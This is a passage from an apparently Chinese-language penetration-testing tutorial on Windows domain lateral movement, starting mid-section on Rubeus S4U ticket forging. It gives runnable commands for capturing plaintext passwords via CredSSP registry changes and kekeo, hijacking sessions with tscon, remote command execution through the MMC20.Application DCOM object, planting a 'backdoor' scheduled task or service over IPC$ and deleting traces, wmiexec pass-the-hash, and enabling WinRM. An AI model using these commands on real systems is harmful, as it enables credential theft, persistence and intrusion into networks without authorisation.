我们在以administrator账户身份进行S4U时，只能进行S4U2SELF，不能进行S4U2PROXY。我们用 `Rubeus.exe s4u
/user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7
/impersonateuser:administrator /msdsspn:cifs/dm2008
/ptt`继续实验administrator，发现确实是这样
此时我们用 rubeus.exe describe /ticker:S4Ubase64加密的票据
可以发现servicename并没有指定某个服务，仅仅只有一个账户.即发生了服务名称缺失的问题。很简单，把票据修改一下就行了.网上很多说用这个工具  
但实际上rubeus也能完成票据修改`rubeus.exe tgssub /ticket:xxx /altservice:cifs/test1 /ptt`
完事
## credssp 导出用户明文密码
CredSSP协议的目的是将用户的明文密码从CredSSP客户端委派给CredSSP服务器。 通常运用于远程桌面服务。
我们在配置这个协议时，一般在组策略编辑器里配置。
Allow delegating default
credentials表示在通过使用受信任的X509证书或Kerberos实现服务器身份验证时自动发送当前用户的凭据，即明文密码。
Allow delegating default credentials with NTLM-only server
authentication表示在通过NTLM实现服务器身份验证时自动发送当前用户的凭据，即明文密码。
这几个属性在注册表里对应
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation。
### 攻击原理
那么这样看，这个攻击流程就很自然了。  
我们要获得两台机器，一台机器当作远程桌面的服务器，一台当作远程桌面的客户端。  
在客户端上配置组策略（CREDSSP），使其在远程桌面身份验证时发送明文密码。  
然后开始远程桌面验证，在服务器上获得客户端发来的明文密码.
### 实操
1.通过修改注册表，改变组策略身份验证的凭据策略(选一个），这一步需要管理员权限，本地或域管
    reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v AllowDefaultCredentials /t REG_DWORD /d 1
    reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v AllowDefCredentialsWhenNTLMOnly /t REG_DWORD /d 1
    reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v ConcatenateDefaults_AllowDefault /t REG_DWORD /d 1
    reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v ConcatenateDefaults_AllowDefNTLMOnly /t REG_DWORD /d 1
    reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefaultCredentials /v 1 /t REG_SZ /d *
    reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefCredentialsWhenNTLMOnly /v 1 /t REG_SZ /d *
一股脑设置好就完事了。。（用户需重新登陆才生效）
然后开始获取密码
我们刚刚提到需要两台电脑才能获取密码，其实那只是一个模型，一个机器既可以当作客户端又可以当作服务端的。  
我们用kekeo实现攻击（本机向本机获取密码时，普通用户即可完成以下操作）
    tsssp::server 开启服务端
    tsssp::client /target:...   开启客户端，这里的target随便填
那么再回到需要两个机器，一个当服务端一个当客户端的情况吧。
服务端建立: tsssp::server 需要SYSTEM权限
客户端链接: tsssp::client /target:服务端的SPN（一般采用TERMSRV服务） /pipe:
\服务端域名\pipe\kekeo_tsssp_endpoint 普通用户权限即可
## tscon横向
若一个机器上有多个用户登录，则在任务管理器可以看见如下场面
其中，我们可以右键其他用户选择链接，输入其密码后就能进入其桌面
但是对于system用户来说，要链接到其他用户是不需要输入密码的，可以直接连接。所以我们可以通过system权限获取登录在当前机器上的域用户权限。  
比如上图中的administrator是域管，我有当前机器的system权限，那么我可以直接用以下命令完成用户权限获得。
query user 获得administrator用户的id
可以发现admin的id是2，那么我们就可以用tscon这个windows自带的命令行工具完成权限获得。
cmd /k tscon 2 /dest:console
执行以上命令，我们跳转到了admin的桌面
## 利用COM/DCOM对象
参考:
### 前言
DCOM是COM的扩展，允许应用程序实例化和访问远程计算机上的COM对象。  
这里简要说一下几个有关COM的概念
CLSID：又叫CLASSID 一个COM类的唯一标识符，每一个Windows注册类与一个CLSID相关联。长得像这样
{20D04FE0-3AEA-1069-A2D8-08002B30309D}
ProgID：其可被用作对用户更友好的替代的一个CLSID，比如MMC20.APPLICATION.1就是一个ProgID。ProgID不能保证是唯一的，并非每个类都与ProgID相关联
Appid:
为了保证COM对象能被顺利的远程调用（即为了使DCOM可访问COM对象），需要把APPID与该类的CLSID相关联，且AppID需设置权限来规划哪些客户端能够访问
我们可以通过powershell执行get-CimInstance 来列出本地COM程序列表
远程DCOM对象实例化的流程:
    客户端从远程计算机请求实例化由CLSID表示的对象。如果客户端使用ProgID则先将其本地解析为CLSID。
    远程计算机检查是否存在由该CLSID所关联的AppID，并验证客户端的权限。
    DCOMLaunch服务将创建所请求的类的实例，通常是通过运行LocalServer32子项的可执行文件，或者通过创建DllHost进程来承载InProcServer32子项引用的dll。
    客户端应用程序和服务器进程间建立通信，客户端便可以访问新创建的对象。
### MMC20.APPLICATION.1
中文名为： Microsoft管理控制台（MMC）2.0包括脚本对象模型。
我们一步步抽丝剥茧跟踪一下这个对象的利用点，需要注意的一点是调用该对象必须要有管理员权限。
如上图，我们先列出在MMC20.APPLICATION中的模块，然后继续列出其中Document中的属性，再继续列出Document.ActiveView中的属性。可以发现一个名为ExecuteShellCommand的方法，光是听名字就知道是可以执行shell命令的方法了。到微软文档查一查这个方法，获得了以下信息。
    ExecuteShellCommand（[命令][目录][叁数][窗口状态]）
    命令
    一个值，指定要执行的命令。可以指定标准路径。Command中包含的所有环境变量（例如“％windir％”）都将被扩展。
    目录
    一个值，用于指定工作目录的名称。Directory中包含的所有环境变量都将被扩展。如果“目录”为空字符串，则将当前目录用作工作目录。
    参数
    一个指定Command要使用的参数（如果有）的值；参数必须用空格分隔。例如，将参数指定为“ Param1 Param2”会导致Command接收Param1和Param2作为参数。如果要求单个参数用双引号引起来，请使用适合您的编程语言的技术。例如，在Microsoft Visual Basic中，将参数指定为“ Param1”“这是Param2”“”导致命令接收到参数1和“这是Param2”。
    窗口状态
    一个指定窗口状态的值。该值可以是以下字符串值之一，也可以是空字符串。如果为空字符串，则默认为“已恢复”。
    “Maximized”
    该命令在最大化的窗口中执行。
    “Minimized”
    该命令在最小化的窗口中执行。
    “Restored”
    该命令在已恢复或正常的窗口中执行。注意：这里会弹个黑框框
    返回值
    此方法不返回值。
于是乎，我们就能理所应当的想到这个东西可以被用于本地任意命令执行，就像这样
    [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application")).Document.ActiveView.Executeshellcommand('cmd.exe',$null,"/c calc.exe","Restored")
我们进一步发掘其横向移动的能力
我们知道DCOM具有通过网络与对象进行交互的能力，在我们是管理员的前提下我们可以使用GetTypeFromProgID()与powershell进行DCOM远程交互。  
GetTypeFromProgID("COM","远程ip")
即可指定与哪一个远程IP进行交互。所以我们可以把payload改造成这样，进而可以在其他机器上进行任意命令执行，从而达到横向移动的目的
    [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application" ，“远程ip”)).Document.ActiveView.Executeshellcommand('cmd.exe',$null,"/c calc.exe","Restored")
## ipc
### ipc简介
IPC$是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，即能建立链接，达到访问远程计算机的目的。利用这个链接不仅可以访问目标机器中的文件，进行上传下载等操作，还能在目标机器上执行部分命令。
    net use \\ip\ipc$ "password" /user:username
如果账户和口令正确，就建立好了链接。
建立好链接后就能执行以下命令
    dir \\192.168.183.130\c$ 列出C盘
    copy C:\Users\douser\Desktop\whoami.txt \\192.168.183.130\c$ 上传文件
    tasklist /S 192.168.183.130 /U administrator /P liu78963 列出某IP上的进程信息，/U指定哪个用户执行该命令，/p指定该用户密码
    net use \\IP /del /y 删除链接
    net use 查看已建立的ipc链接
### 利用ipc横向移动
#### at
    at \\192.168.183.130 17:05:00 cmd.exe /c ""
    at \\192.168.183.130 17:05:00 powershell.exe -c ""
关于时间的获得，可以使用 net time \\\IP 获得。
计划任务执行后需要删除，不留痕迹
    at \\192.168.183.130 1 /delete  //1为任务的ID
关于此方法我们可以先通过copy上传恶意文件然后通过at来执行它，或者直接通过powershell远程加载上线等
#### **schtasks**
at命令已经被Windows Vista、Windows Server 2008及之后版本的操作系统废弃了，取而代之的是schtasks命令。
横向移动的大致思路与at差不多。
    在目标主机上创建一个名称为“backdoor”的计划任务。该计划任务每分钟启动一次，启动程序为我们之前到C盘下的shell.exe，启动权限为system。
    schtasks /create /s 192.168.183.130 /tn backdoor /sc minute /mo 1  /tr c:\shell.exe /ru system /f 
    但也有些时候，由于当前权限或组策略设置等原因，该schtasks方法远程创建计划任务可能会报错拒绝访问,遇到这种情况，我们可以加上/u和/p参数分别设置高权限用户名和密码 
    schtasks /create /s 192.168.183.130 /u username /p password /tn backdoor /sc minute /mo 1 /tr c:\shell.exe /ru system /f
    另外，在我们创建好计划任务后，可以通过下列指令立即让计划任务执行（如果拒绝访问的话就加上/u /p参数）
    schtasks /run /s 192.168.183.130 /i /tn backdoor  // i：忽略任何限制立即运行任务
    计划任务执行后需要清理痕迹
    schtasks /delete /s 192.168.183.130 /tn "backdoor" /f
#### sc
这个命令可以操控服务。
    sc \\[主机名/IP] create [servicename] binpath= "[path]"   #创建服务，其中binpath可以是某个exe文件的路径，也可以是一段指令。当为路径时，服务启动时会自动执行该exe文件，当为指令时，服务启动时会自动执行该指令
    sc \\[host] start [servicename] 启动某个服务
    sc \\[host] delete [servicename]   #删除服务
## wmi
从Windows
98开始，Windows操作系统都支持WMI。WMI是由一系列工具集组成的，可以通过/node选项使用端口135上的远程过程调用(RPC)进行通信以进行远程访问，它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。并且wimc执行命令时不会留下日志信息。
通过wmic在远程主机上开启进程
    wmic /node:192.168.183.130 /user:administrator /password:Liu78963 process call create "command"
### wmiexec
通过wmic创建远程进程时，不会有回显，需要通过ipc$链接type，重定向等手段才能看到回显结果，就很不方便，wmicexec的出现就很好的解决了这一痛点。具体原理是通过wmic在135端口进行交互，再把内容通过445端口传回来。
wmiexec普遍来说有三种版本.py，exe，.vbs。可以走socks5协议代入内网，杜绝了bypassav的麻烦。  
(exe版本网上似乎很不好找)
这里用python版本，下载链接
impacket按照网上安装来弄就行了  
1.环境linux，我们配置好proxychanis代入内网（略  
2.proxychains wmiexec.py 域名/用户名:密码@ip 获得shell  
3.也可以进行hash传递 python wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@目标IP
效果图
## winrm
​ winRm（微软远程管理）是WS-Management协议的实现组件。WinRM是windows操作系统的一部分。是一项允许管理员在系统上远程执行管理任务的服务。通信通过HTTP（5985）或HTTPS
SOAP（5986）执行，默认情况下支持Kerberos和NTLM身份验证以及基本身份验证。 你需要管理员身份才能使用它。  
​ 适用版本:适用于 Win server 2008 / Win7 及以后的系统，但是 Win server 2008 / PC
全版本系统默认关闭。只有在Win server 2012 之后的版本的WinRM服务才默认启动并监听了5985端口，允许远程任意主机来管理。
我们可以通过如下powershell命令查看机器上的winrm是否正常运行
    Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}
若没开启，你可以在管理员权限下执行以下指令开启
    winrm quickconfig -q
    or
    Enable-PSRemoting -Force
远程命令执行